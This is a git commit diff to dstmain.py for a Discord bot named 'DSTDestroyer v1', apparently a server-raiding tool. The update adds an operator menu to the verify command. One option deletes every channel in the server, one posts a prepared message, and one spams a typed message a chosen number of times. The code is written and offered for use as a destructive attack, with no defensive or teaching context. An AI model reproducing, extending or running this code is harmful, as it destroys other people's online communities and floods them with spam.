9aede0dad2292748342da480089c8fa56a98199e
cmdcustom <76268123+cmdcustom@users.noreply.github.com>
2021-03-17 17:13:44 -0600

    Update dstmain.py

--- dstmain.py
+++ dstmain.py
@@ -3,7 +3,7 @@ from discord.ext import commands
 import pyfiglet
 import hashlib
 import random
-
+import time
 
 print(pyfiglet.figlet_format('DSTDestroyer v1'))
 
@@ -15,21 +15,39 @@ print(f'''Please enter the command:
 
 .verify {auth}
 
-Into the server so we can get the ID.
+Into your server so we can confirm it is you.
 ''')
 
 @bot.command()
 async def verify(ctx, token1):
+  input('Press enter when you are ready to start.')
   global auth
+  
   if token1 == auth:
-    input('Press enter to start.')
-    await ctx.send(open('message.txt').read())
-    time.sleep(5)
-    for c in ctx.guild.channels:
-      time.sleep(1)
-      await c.delete()
-  else:
-    print('Wrong Token...')
+    while 1:
+      choice = input('''
+DEL: Finish Off
+SENDM: Send message.txt
+SPAM: Send Message many times
+Choice: ''')
+      if choice == 'del' or choice == 'DEL':
+          for c in ctx.guild.channels:
+            await c.delete()
+            print(f'Deleted {c}')
+      if choice == 'sendm' or choice == 'SENDM':
+        await ctx.send(open('message.txt').read())
+      if choice == 'spam' or choice == 'SPAM':
+        times = int(input('How many times to send message: '))
+        message = input('Message: ')
+        for i in range(1, times+1):
+          await ctx.send(message)
+        
+    else:
+      print('Wrong auth...')
+        
 
 bot.run(token)
+
+
+
 
